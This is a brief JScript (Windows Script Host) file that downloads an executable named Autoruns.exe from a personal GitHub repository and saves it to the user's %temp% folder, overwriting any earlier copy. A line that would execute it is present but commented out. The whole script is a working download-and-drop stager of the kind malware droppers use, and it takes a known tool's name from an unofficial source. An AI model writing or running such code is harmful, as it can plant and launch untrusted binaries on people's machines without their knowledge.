var Source = "https://github.com/tconqueror/bla/raw/master/Autoruns.exe";
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', Source, false);
Object.Send();
var r = new ActiveXObject("WScript.Shell");
var appdata = r.ExpandEnvironmentStrings("%temp%");
Target = appdata + "\\Autoruns.exe"

// Create the Data Stream
var Stream = WScript.CreateObject('ADODB.Stream');

// Establish the Stream
Stream.Open();
Stream.Type = 1; // adTypeBinary
Stream.Write(Object.ResponseBody);
Stream.Position = 0;

// Create an Empty Target File
var File = WScript.CreateObject('Scripting.FileSystemObject');
if (File.FileExists(Target))
{
    File.DeleteFile(Target);
}

// Write the Data Stream to the File
Stream.SaveToFile(Target, 2); // adSaveCreateOverWrite
Stream.Close();
//r.Run(Target);